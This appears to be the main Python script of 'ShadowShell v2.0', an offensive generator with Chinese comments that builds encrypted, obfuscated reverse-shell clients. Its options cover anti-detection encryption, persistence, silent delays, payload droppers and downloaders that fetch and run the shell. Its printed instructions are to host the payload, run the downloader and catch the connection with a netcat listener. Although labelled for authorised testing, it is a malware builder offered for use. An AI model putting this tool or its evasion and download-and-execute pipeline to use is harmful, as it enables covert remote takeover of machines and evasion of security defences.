#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowShell v2.0 - 高级模块化Shell生成器
Advanced Modular Shell Generator

作者: Teror Fox (@sysfox)
GitHub: https://github.com/sysfox

提供加密的反向Shell客户端生成功能
用于渗透测试和安全研究 (仅限授权使用)
"""

import sys
import os

# 导入模块
from modules import (
    AdvancedCipher, gene_advanced_key,
    gene_code, gene_code_obfuscated, advanced_obfuscate_code,
    gene_shell, create_payload_dropper, create_downloader,
    validate_ip, validate_port, create_config_file, print_results,
    interactive_mode, command_line_mode
)


def main():
    """主函数"""
    try:
        # 检查是否有命令行参数
        if len(sys.argv) > 1:
            args = command_line_mode()
            config = {
                'ip': args.ip,
                'port': args.port,
                'retry': args.retry,
                'delay': args.delay,
                'key_length': args.key_length,
                'output_dir': args.output,
                'filename': args.filename,
                'persistence': args.persistence,
                'anti_detection': args.anti_detection,
                'use_dropper': args.use_dropper,
                'use_downloader': args.use_downloader,
                'download_url': args.download_url,
                'downloader_silent': args.downloader_silent,
                'silent_delay': args.silent_delay
            }
            quiet = args.quiet
        else:
            config = interactive_mode()
            quiet = False
            config['silent_delay'] = config.get('silent_delay', 30)  # 默认值
        
        # 验证输入
        if not validate_ip(config['ip']):
            print("❌ IP地址格式不正确")
            sys.exit(1)
        
        if not validate_port(str(config['port'])):
            print("❌ 端口号不正确")
            sys.exit(1)
        
        # 创建输出目录
        os.makedirs(config['output_dir'], exist_ok=True)
        
        if not quiet:
            print("\n🔧 正在生成Shell...")
        
        # 检查是否使用下载器模式
        if config.get('use_downloader', False):
            # 下载器模式 - 生成两个文件
            if not config.get('download_url'):
                print("❌ 下载器模式需要指定下载URL")
                sys.exit(1)
                
            # 1. 生成主程序（正常的Shell）
            if config['use_dropper']:
                raw_code = gene_code_obfuscated(config['ip'], config['port'], config['retry'], config['delay'])
            else:
                raw_code = gene_code(config['ip'], config['port'], config['retry'], config['delay'])
                
            raw_code = advanced_obfuscate_code(raw_code)  # 高级代码混淆
            
            key = gene_advanced_key(config['key_length'])
            
            # 加密
            cipher = AdvancedCipher(key)
            encrypted_code = cipher.multi_layer_encrypt(raw_code) if config['anti_detection'] else cipher.encrypt(raw_code)
            
            # 生成主Shell文件
            if config['use_dropper']:
                main_filepath = create_payload_dropper(encrypted_code, key, config['output_dir'])
            else:
                main_filepath = gene_shell(
                    encrypted_code, 
                    key, 
                    config['output_dir'], 
                    config['filename'],
                    config['persistence'],
                    config['anti_detection'],
                    config.get('silent_delay', 30)
                )
            
            # 2. 生成下载器文件
            downloader_filepath = create_downloader(
                config['download_url'],
                config.get('downloader_silent', True),
                config['output_dir'],
                filename=None  # 让函数自动生成下载器文件名
            )
            
            # 创建配置文件
            config_path = create_config_file(config['ip'], config['port'], key, main_filepath)
            
            # 打印结果
            if not quiet:
                print(f"\n✅ 下载器模式完成！")
                print(f"📁 主程序文件: {main_filepath}")
                print(f"📁 下载器文件: {downloader_filepath}")
                print(f"📁 配置文件: {config_path}")
                print(f"🔗 下载URL: {config['download_url']}")
                print(f"🔇 下载器静默: {'是' if config.get('downloader_silent', True) else '否'}")
                print(f"\n⚠️  使用说明:")
                print(f"   1. 将主程序文件上传到: {config['download_url']}")
                print(f"   2. 运行下载器文件来自动下载并执行主程序")
                print(f"   3. 监听命令: nc -lvnp {config['port']}")
            
        else:
            # 标准模式 - 原有逻辑
            if config['use_dropper']:
                raw_code = gene_code_obfuscated(config['ip'], config['port'], config['retry'], config['delay'])
            else:
                raw_code = gene_code(config['ip'], config['port'], config['retry'], config['delay'])
                
            raw_code = advanced_obfuscate_code(raw_code)  # 高级代码混淆
            
            key = gene_advanced_key(config['key_length'])
            
            # 加密
            cipher = AdvancedCipher(key)
            encrypted_code = cipher.multi_layer_encrypt(raw_code) if config['anti_detection'] else cipher.encrypt(raw_code)
            
            # 生成Shell文件
            if config['use_dropper']:
                filepath = create_payload_dropper(encrypted_code, key, config['output_dir'])
            else:
                filepath = gene_shell(
                    encrypted_code, 
                    key, 
                    config['output_dir'], 
                    config['filename'],
                    config['persistence'],
                    config['anti_detection'],
                    config.get('silent_delay', 30)
                )
            
            # 创建配置文件
            config_path = create_config_file(config['ip'], config['port'], key, filepath)
            
            # 打印结果
            print_results(filepath, config_path, key, config, quiet)
    
    except KeyboardInterrupt:
        print("\n\n❌ 用户中断操作")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ 发生错误: {str(e)}")
        sys.exit(1)


if __name__ == '__main__':
    main()
